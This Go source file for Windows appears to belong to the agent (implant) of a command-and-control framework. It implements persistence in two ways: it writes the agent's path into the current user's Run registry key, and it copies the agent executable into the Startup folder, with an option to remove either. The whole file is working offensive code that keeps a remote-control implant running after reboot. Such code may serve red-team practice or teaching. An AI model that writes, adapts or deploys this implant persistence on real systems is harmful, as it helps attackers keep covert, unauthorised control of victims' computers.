//go:build windows

package agent

import (
	"fmt"
	"os"
	"path/filepath"

	"golang.org/x/sys/windows/registry"

	"c2framework/internals/control"
	"c2framework/internals/models"
)

const (
	runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`
)

// doPersist performs the persistence operation on Windows
func doPersist(args control.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: args.Method,
	}

	switch args.Method {
	case "registry":
		return doPersistRegistry(args)
	case "startup":
		return doPersistStartup(args)
	default:
		result.Success = false
		result.Message = fmt.Sprintf("unknown method: %s", args.Method)
		return result
	}
}

// doPersistRegistry handles Registry Run Key persistence
func doPersistRegistry(args control.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: "registry",
	}

	// Open the Run key
	key, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE|registry.QUERY_VALUE)
	if err != nil {
		result.Success = false
		result.Message = fmt.Sprintf("failed to open registry key: %v", err)
		return result
	}
	defer key.Close()

	if args.Remove {
		// Remove the registry value
		err = key.DeleteValue(args.Name)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to delete registry value: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Removed registry persistence '%s'", args.Name)
	} else {
		// Set the registry value to our executable path
		err = key.SetStringValue(args.Name, args.AgentPath)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to set registry value: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Installed registry persistence '%s' -> %s", args.Name, args.AgentPath)
	}

	return result
}

// doPersistStartup handles Startup Folder persistence
func doPersistStartup(args control.PersistArgsAgent) models.PersistResult {
	result := models.PersistResult{
		Method: "startup",
	}

	// Get the Startup folder path
	appData := os.Getenv("APPDATA")
	if appData == "" {
		result.Success = false
		result.Message = "APPDATA environment variable not set"
		return result
	}
	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")

	// Create executable filename (we copy the exe, not a shortcut)
	exePath := filepath.Join(startupPath, args.Name+".exe")

	if args.Remove {
		// Remove the executable
		err := os.Remove(exePath)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to remove startup executable: %v", err)
			return result
		}
		result.Success = true
		result.Message = fmt.Sprintf("Removed startup executable '%s'", args.Name)
	} else {
		// For simplicity, we'll copy the executable instead of creating a shortcut
		// Creating proper .lnk files requires COM or external tools
		copyPath := filepath.Join(startupPath, args.Name+".exe")

		// Read original file
		data, err := os.ReadFile(args.AgentPath)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to read agent: %v", err)
			return result
		}

		// Write to startup folder
		err = os.WriteFile(copyPath, data, 0755)
		if err != nil {
			result.Success = false
			result.Message = fmt.Sprintf("failed to copy to startup folder: %v", err)
			return result
		}

		result.Success = true
		result.Message = fmt.Sprintf("Copied agent to startup folder: %s", copyPath)
	}

	return result
}
